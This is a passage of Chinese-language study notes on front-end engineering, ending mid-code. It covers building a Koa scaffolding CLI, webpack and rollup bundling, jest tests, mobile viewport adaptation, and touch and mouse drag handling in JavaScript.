href="https://learn.kaikeba.com/catalog/223769?type=1">https://learn.kaikeba.com/catalog/223769?type=1</a> 等以后有能力再看。。。</p><h2 id="一、初始化——实现-setup-koa-的-cli-工具"><a href="#一、初始化——实现-setup-koa-的-cli-工具" class="headerlink" title="一、初始化——实现 setup-koa 的 cli 工具"></a>一、初始化——实现 setup-koa 的 cli 工具</h2><p>通过自己写一个<strong>脚手架</strong>初始化项目，解决初始化时需要重复加载相同依赖的问题。</p><p>最核心思维：<strong>自动化</strong></p><p>案例：实现基于 koa 的脚手架</p><hr><p>以问题驱动的方式实现：</p><p>0.使用 esm 规范，在 package.json 中添加 type 为 module。</p><p>1.手动创建需4个步骤，因此在入口文件用代码解决</p><ul><li><p>创建文件夹（项目名）<code>fs.mkdirSync(getRootPath());</code> 每次运行时要删除原有文件夹，在 package.json 中</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;test&quot;</span>: <span class="string">&quot;rimraf ./haha &amp;&amp; node index.js&quot;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p>创建 index.js, 通过模板渲染 index.js <code>fs.writeFileSync(getRootPath()+&quot;/index.js&quot;, createIndexTemplate(inputConfig));</code></p></li><li><p>创建 Package.json <code>fs.writeFileSync(getRootPath()+&quot;/package.json&quot;, &quot;package.json&quot;);</code></p></li><li><p>安装依赖 <code>// TODO package -&gt; yarn</code></p></li></ul><p>2.主流程搞定，细化分支：index中的代码用模板（``）来渲染</p><p>3.模板应该是<strong>动态</strong>的，因此导入ejs（由于单一职责，因此创建模板文件夹）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在ejs文件中通过传参动态渲染</span><br><span class="line">&lt;% if (router) &#123; %&gt;</span><br><span class="line">const Router = require(&quot;koa-router&quot;);</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>4.package.json 模板渲染（同index.js）</p><p>5.支持用户命令行输入：利用 inquirer库</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node.js支持顶层 await</span></span><br><span class="line"><span class="keyword">const</span> answer = <span class="keyword">await</span> inquirer.prompt([</span><br><span class="line">    &#123; <span class="attr">type</span>: <span class="string">&quot;input&quot;</span>, <span class="attr">name</span>: <span class="string">&quot;packageName&quot;</span>, <span class="attr">message</span>: <span class="string">&quot;set package name&quot;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">type</span>: <span class="string">&quot;number&quot;</span>, <span class="attr">name</span>: <span class="string">&quot;port&quot;</span>, <span class="attr">message</span>: <span class="string">&quot;set port number&quot;</span>, <span class="attr">default</span>:<span class="function">()=&gt;</span><span class="number">8080</span>&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;checkbox&quot;</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;middleware&quot;</span>,</span><br><span class="line">        <span class="attr">choices</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&quot;koaStatic&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&quot;koaRouter&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">        ],</span><br><span class="line">    &#125;,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><p>以上，所有功能（除安装依赖）就已经实现：</p><p><strong>优化：</strong></p><p>1.将 answer 抽离到 question.js中</p><p>2.将 config 抽离到 config.js中</p><p>3.通过 prettier 格式化生成的 js 文件</p><p><strong>安装依赖：</strong>（可以通过 spawn 子进程方式安装）</p><p>也可通过 execa 库安装：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">execa(<span class="string">&quot;yarn&quot;</span>, &#123;</span><br><span class="line">    <span class="comment">// 路径不对，因此通过 cwd 指定路径</span></span><br><span class="line">    <span class="attr">cwd</span>: getRootPath(),</span><br><span class="line">    <span class="comment">// // 标志子进程继承于父进程输出</span></span><br><span class="line">    <span class="comment">// stdio:[2,2,2],</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>全局使用脚手架：</strong></p><p>1.相对路径改绝对路径：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; fileURLToPath &#125; <span class="keyword">from</span> <span class="string">&quot;url&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// esm 下使用 __dirname</span></span><br><span class="line">  <span class="keyword">const</span> __dirname = fileURLToPath(<span class="keyword">import</span>.meta.url);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> template = fs.readFileSync(path.resolve(__dirname, <span class="string">&quot;../template/index.ejs&quot;</span>), <span class="string">&quot;utf-8&quot;</span>).toString();</span><br></pre></td></tr></table></figure><ol start="2"><li>通过 bin 和 sheBang:</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line"><span class="string">&quot;bin&quot;</span>: <span class="string">&quot;./bin/index.js&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//index.js</span></span><br><span class="line">#!<span class="regexp">/usr/</span>bin/env node</span><br><span class="line"><span class="comment">// sheBang windows下不生效</span></span><br></pre></td></tr></table></figure><h2 id="二、开发"><a href="#二、开发" class="headerlink" title="二、开发"></a>二、开发</h2><p>即一些 bundle（打包工具）</p><h3 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h3><p>原理：<strong>递归地构建一个依赖关系图(dependency graph)，其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle。</strong></p><p><img src="https://i.loli.net/2021/09/23/FMKtJfrW3TiayH6.png" alt="image.png"></p><h3 id="rollup"><a href="#rollup" class="headerlink" title="rollup"></a>rollup</h3><p>天然支持 esm，（导入的模块没用，则不会在 bundle.js 中出现）</p><p>1、原理：通过 esm 生成静态 ast 抽象语法树，分析代码得到数据结构，再生成对应的代码。<strong>解析代码后会得到很多的信息，基于这些信息做处理，比如合并代码，删减代码（tree-shaking）。</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rollup.config.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">input</span>: <span class="string">&quot;./index.js&quot;</span>,</span><br><span class="line">    <span class="attr">output</span>: &#123;</span><br><span class="line">        <span class="attr">file</span>: <span class="string">&quot;dist/bundle.js&quot;</span>,</span><br><span class="line">        <span class="attr">format</span>:<span class="string">&quot;esm&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、<strong>plugins 的用法 <code>plugins: [json()]</code>，</strong>比如</p><ul><li>解析 json ： <code>import json from &quot;@rollup/plugin-json&quot;;</code></li><li>压缩生成的 bundle 文件：<code>import &#123;terser&#125; from &#39;rollup-plugin-terser&#39;</code></li></ul><p>且在不同的输出文件中支持不同的规范。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rollup.config.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">input</span>: <span class="string">&quot;./index.js&quot;</span>,</span><br><span class="line">    <span class="attr">output</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">file</span>: <span class="string">&quot;dist/bundle.esm.js&quot;</span>,</span><br><span class="line">            <span class="attr">format</span>: <span class="string">&quot;esm&quot;</span>,</span><br><span class="line">            <span class="attr">plugins</span>: [terser()],</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">file</span>: <span class="string">&quot;dist/bundle.cjs.js&quot;</span>,</span><br><span class="line">            <span class="attr">format</span>: <span class="string">&quot;cjs&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">// 使用plugins</span></span><br><span class="line">    <span class="attr">plugins</span>: [json()],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>3、rollup 天然不解析依赖，遇到只有 commonjs 规范的库也解析不了</p><h3 id="rollup-和-webpack-区别"><a href="#rollup-和-webpack-区别" class="headerlink" title="rollup 和 webpack 区别"></a>rollup 和 webpack 区别</h3><ul><li>写库时 rollup 更好（因为纯代码，不需要什么资源）</li><li>开发应用时 webpack，因为有很多优化如热更新、devserver…</li></ul><h3 id="vite"><a href="#vite" class="headerlink" title="vite"></a>vite</h3><p>todo..</p><h2 id="三、测试"><a href="#三、测试" class="headerlink" title="三、测试"></a>三、测试</h2><h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><p><code>yarn init -y </code> 后先安装 jest :<code>yarn add jest @types/jest --dev</code>。然后新建 add.spec.js </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> add = <span class="built_in">require</span>(<span class="string">&quot;./add&quot;</span>);</span><br><span class="line"></span><br><span class="line">test(<span class="string">&quot;should 1 + 1 = 2&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 准备测试数据 -&gt; given</span></span><br><span class="line">    <span class="keyword">const</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> b = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 触发测试动作 -&gt; when</span></span><br><span class="line">    <span class="keyword">const</span> r = add(a, b);</span><br><span class="line">    <span class="comment">// 验证测试结果 -&gt; then</span></span><br><span class="line">    expect(r).toBe(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// jest -&gt; 匹配器</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>对于一个 input 为 function，output 为：</p><ol><li>return value</li><li>call other function</li><li>change state</li><li>throw error</li></ol><p>函数测试代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = <span class="built_in">require</span>(<span class="string">&quot;./foo&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bar = <span class="built_in">require</span>(<span class="string">&quot;./bar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// mock</span></span><br><span class="line">jest.mock(<span class="string">&quot;./bar.js&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个funciton</span></span><br><span class="line">    <span class="keyword">return</span> jest.fn();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">test(<span class="string">&quot;foo&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    foo();</span><br><span class="line">    expect(bar).toHaveBeenCalled();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="组件测试"><a href="#组件测试" class="headerlink" title="组件测试"></a>组件测试</h3><p>借助 cypress 进行组件测试</p><p>用代码模拟用户的操作行为</p><h3 id="e2e测试"><a href="#e2e测试" class="headerlink" title="e2e测试"></a>e2e测试</h3><p>在最外层，测试整个应用（包含很多组件）</p><p><img src="https://i.loli.net/2021/10/03/DSkre5xLGORFI4m.png" alt="image.png"></p><h3 id="git-hook"><a href="#git-hook" class="headerlink" title="git hook"></a>git hook</h3><h3 id="lint-amp-eslint"><a href="#lint-amp-eslint" class="headerlink" title="lint &amp; eslint"></a>lint &amp; eslint</h3><p>这俩真没听懂。</p><h2 id="四、基础能力"><a href="#四、基础能力" class="headerlink" title="四、基础能力"></a>四、基础能力</h2><h3 id="webpack-loader"><a href="#webpack-loader" class="headerlink" title="webpack loader"></a>webpack loader</h3><p>目的：因为 webpack 无法打包非 js 文件，如 .md，因此手动实现一个 loader，将 md -&gt; htmlString</p><h3 id="webpack-plugin"><a href="#webpack-plugin" class="headerlink" title="webpack plugin"></a>webpack plugin</h3><p>核心：在对应的时机做对应的事</p><h1 id="9-22-Web组件"><a href="#9-22-Web组件" class="headerlink" title="9.22 Web组件"></a>9.22 Web组件</h1><p>爬取某个组件官网上所有组件名称：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">document</span>.querySelectorAll(<span class="string">&quot;#my .v-list-item&quot;</span>)).map(<span class="function"><span class="params">e</span>=&gt;</span>e.innerText).join(<span class="string">&quot;\n&quot;</span>))</span><br></pre></td></tr></table></figure><p>拖拽 div 代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;dragable&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;height: 100px; border:solid 1px green&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">enableDrag</span>(<span class="params">element</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> x0, y0;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> ex = <span class="number">0</span>,</span></span><br><span class="line"><span class="javascript">            ey = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> move = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> [dx, dy] = [e.clientX - x0, e.clientY - y0];</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(dx, dy);</span></span><br><span class="line"><span class="javascript">            element.style.transform = <span class="string">`translate(<span class="subst">$&#123;ex + dx&#125;</span>px, <span class="subst">$&#123;ey + dy&#125;</span>px) `</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> up = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.removeEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.removeEventListener(<span class="string">&quot;mouseup&quot;</span>, up);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> [dx, dy] = [e.clientX - x0, e.clientY - y0];</span></span><br><span class="line"><span class="javascript">            ex += dx, ey += dy;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        element.addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            [x0, y0] = [e.clientX, e.clientY];</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mouseup&quot;</span>, up);</span></span><br><span class="line"><span class="javascript">        &#125;);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    enableDrag(<span class="built_in">document</span>.getElementById(<span class="string">&quot;dragable&quot;</span>));</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="9-23-Web-移动端"><a href="#9-23-Web-移动端" class="headerlink" title="9.23 Web 移动端"></a>9.23 Web 移动端</h1><h2 id="一、移动端适配"><a href="#一、移动端适配" class="headerlink" title="一、移动端适配"></a>一、移动端适配</h2><h3 id="视口设置"><a href="#视口设置" class="headerlink" title="视口设置"></a>视口设置</h3><ul><li><p>viewport 移动端特有设置，解决移动端屏幕过小的问题（不设置 viewport 时，视口大小默认为980）。</p></li><li><p>dpr 像素比：原先 1px 的内容 放大到 devicePixelRatio px 显示</p></li><li><p>通过 js 动态设置：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> metaEl = <span class="built_in">document</span>.createElement(<span class="string">&#x27;meta&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> scale = devicePixelRatio;</span><br><span class="line">    metaEl.setAttribute(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;viewport&#x27;</span>);</span><br><span class="line">    metaEl.setAttribute(<span class="string">&#x27;content&#x27;</span>, <span class="string">&#x27;initial-scale=&#x27;</span> + (<span class="number">1</span> / scale) + <span class="string">&#x27;,maximum-scale= &#x27;</span> + (<span class="number">1</span> / scale) +</span><br><span class="line">        <span class="string">&#x27;minimum-scale=&#x27;</span> + (<span class="number">1</span> / scale) + <span class="string">&#x27;, user-scalable=no&#x27;</span>);</span><br><span class="line">    <span class="built_in">document</span>.documentElement.firstElementChild.appendChild(metaEl);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></li></ul><h3 id="适配方案"><a href="#适配方案" class="headerlink" title="适配方案"></a>适配方案</h3><ul><li><p>百分比</p></li><li><p>rem ：1rem =1 root(html) font-size</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// root em 设置 </span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 375/15</span></span><br><span class="line">    <span class="keyword">var</span> doc=<span class="built_in">document</span>.documentElement;</span><br><span class="line">    doc.style.fontSize=<span class="built_in">window</span>.innerWidth/<span class="number">15</span>+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">&#125;)()</span><br><span class="line">ript&gt;</span><br></pre></td></tr></table></figure></li><li><p>vw：100 vw = 1 屏幕</p></li><li><p>对于一些比较精细的东西（如较小的字，可以使用媒体查询）</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* width ≤ 最大尺寸(640px)时，呈现下面的样式 */</span></span><br><span class="line"><span class="keyword">@media</span> all <span class="keyword">and</span> (<span class="attribute">max-width</span>:<span class="number">640px</span>) &#123;</span><br><span class="line">    <span class="selector-tag">nav</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">        <span class="attribute">color</span>: green;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="二、移动端事件"><a href="#二、移动端事件" class="headerlink" title="二、移动端事件"></a>二、移动端事件</h2><h3 id="touch事件"><a href="#touch事件" class="headerlink" title="touch事件"></a>touch事件</h3><ul><li><p>touchstart</p></li><li><p>touchmove</p><ul><li>changedTouches   触发当前事件的手指列表</li><li>targetTouches   当前元素上的手指列表</li><li>touches   当前屏幕中的手指列表</li></ul></li><li><p>touchend</p></li><li><p>特定场景下阻止一些默认行为</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&quot;touchstart&quot;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">passive</span>: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>滚动条滚动</li><li>页面缩放</li><li>超链接</li><li>所有的鼠标事件在移动端的执行（click、mouseup等）</li><li>表单相关控件获得焦点</li></ul></li></ul><h3 id="拖拽原理"><a href="#拖拽原理" class="headerlink" title="拖拽原理"></a>拖拽原理</h3><p><strong>Touch 事件拖拽实现：</strong>（移动端）</p><p>先生成100个 li：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> list = <span class="built_in">document</span>.querySelector(<span class="string">&quot;#list&quot;</span>);</span><br><span class="line">list.innerHTML = [...(<span class="string">&quot;.&quot;</span>.repeat(<span class="number">100</span>))].map(<span class="function">(<span class="params">item, index</span>) =&gt;</span> <span class="string">`&lt;li&gt;这是第<span class="subst">$&#123;index&#125;</span>个li&lt;/li&gt;`</span>).join(<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><p>再根据用户滑动的位置改变当前元素位置：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> list = <span class="built_in">document</span>.querySelector(<span class="string">&quot;#list&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> startPoint = <span class="number">0</span> <span class="comment">// 按下时鼠标的位置</span></span><br><span class="line"><span class="keyword">let</span> startEl = <span class="number">0</span> <span class="comment">// 按下时元素的位置</span></span><br><span class="line"><span class="keyword">let</span> y = <span class="number">0</span>;</span><br><span class="line">list.addEventListener(<span class="string">&quot;touchstart&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> touch = e.changedTouches[<span class="number">0</span>];</span><br><span class="line">    startPoint = touch.clientY;</span><br><span class="line">    startEl = y;</span><br><span class="line">&#125;)</span><br><span class="line">list.addEventListener(<span class="string">&quot;touchmove&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> touch = e.changedTouches[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">let</span> nowPoint = touch.clientY;</span><br><span class="line">    y = startEl + (nowPoint - startPoint);</span><br><span class="line">    list.style.transform = <span class="string">`translate3d(0,<span class="subst">$&#123;y&#125;</span>px,0)`</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>Mouse 事件拖拽实现：</strong>( PC端 )</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> list = <span class="built_in">document</span>.querySelector(<span class="string">&quot;#list&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> startPoint = <span class="number">0</span> <span class="comment">// 按下时鼠标的位置</span></span><br><span class="line"><span class="keyword">let</span> startEl = <span class="number">0</span> <span class="comment">// 按下时元素的位置</span></span><br><span class="line"><span class="keyword">let</span> y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> move = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> nowPoint = e.clientY;</span><br><span class="line">    y = startEl + (nowPoint - startPoint);</span><br><span class="line">    list.style.transform = <span class="string">`translate3d(0,<span class="subst">$&#123;y&#125;</span>px,0)`</span>;</span><br><span class="line">&#125;</span><br><span class="line">list.addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    startPoint = e.clientY;</span><br><span class="line">    startEl = y;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mouseup&quot;</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.removeEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">    &#125;,&#123;<span class="attr">once</span>:<span class="literal">true</span>&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="三、手势库封装"><a href="#三、手势库封装" class="headerlink" title="三、手势库封装"></a>三、手势库封装</h2><h3 id="Mouse-事件与-Touch-事件的兼容处理："><a href="#Mouse-事件与-Touch-事件的兼容处理：" class="headerlink" title="Mouse 事件与 Touch 事件的兼容处理："></a>Mouse 事件与 Touch 事件的兼容处理：</h3><ul><li><p>封装 start、move、end：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gesture.js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enableGesture</span>(<span class="params">ele</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// PC 端</span></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&quot;ontouchstart&quot;</span> <span class="keyword">in</span> <span class="built_in">document</span>)) &#123;</span><br><span class="line">    ele.addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      onStart(e);</span><br><span class="line">      <span class="keyword">let</span> move = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        onMove(e);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">let</span> end = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        onEnd(e);</span><br><span class="line">        <span class="built_in">document</span>.removeEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mousemove&quot;</span>, move);</span><br><span class="line">      <span class="built_in">document</span>.addEventListener(<span class="string">&quot;mouseup&quot;</span>, end, &#123; <span class="attr">once</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchstart&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 移动端事件需遍历 changedTouches</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onStart(touch);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchmove&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onMove(touch);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  ele.addEventListener(<span class="string">&quot;touchend&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> touch <span class="keyword">of</span> e.changedTouches) &#123;</span><br><span class="line">      onEnd(touch);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> onStart = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="comment">// 通过 Object.assign 传递 X\Y 坐标</span></span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;start&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">let</span> onMove = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;move&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">let</span> onEnd = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    ele.dispatchEvent(</span><br><span class="line">      <span class="built_in">Object</span>.assign(<span class="keyword">new</span> CustomEvent(<span class="string">&quot;start&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">clientX</span>: e.clientX,</span><br><span class="line">        <span class="attr">clientY</span>: e.clientY,</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// html</span></span><br><span class="line"><span class="keyword">let</span> list = <span class="built_in">document</span>.querySelector(<span class="string">&quot;#list&quot;</span>);</span><br><span class="line">enableGesture(list);</span><br><span class="line">list.addEventListener(<span class="string">&quot;start&quot;</span>,<span class="function">(<span class="params">e</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">&#125;)</span><br><span class="line">list.addEventListener(<span class="string">&quot;move&quot;</span>,<span class="function">(<span class="params">e</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">&#125;)</span><br><span class="line">list.addEventListener(<span class="string">&quot;end&quot;</span>,<span class="function">(<span class="params">e</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h3 id="常用事件封装"><a href="#常用事件封装" class="headerlink" title="常用事件封装"></a>常用事件封装</h3><ul><li><p>pan 旋转</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enableGesture</span>(<span class="params">ele</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 通过 contexts 标识类型以及其他</span></span><br><span class="line">  <span class="keyword">let</span> contexts = &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> MOUSE_TYPE = <span class="built_in">Symbol</span>(<span class="string">&quot;mouse&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PC 端</span></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&quot;ontouchstart&quot;</span> <span class="keyword">in</span> <span class="built_in">document</span>)) &#123;</span><br><span class="line">    ele.addEventListener(<span class="string">&quot;mousedown&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      contexts[MOUSE_TYPE] = &#123;&#125;;</span><br><span 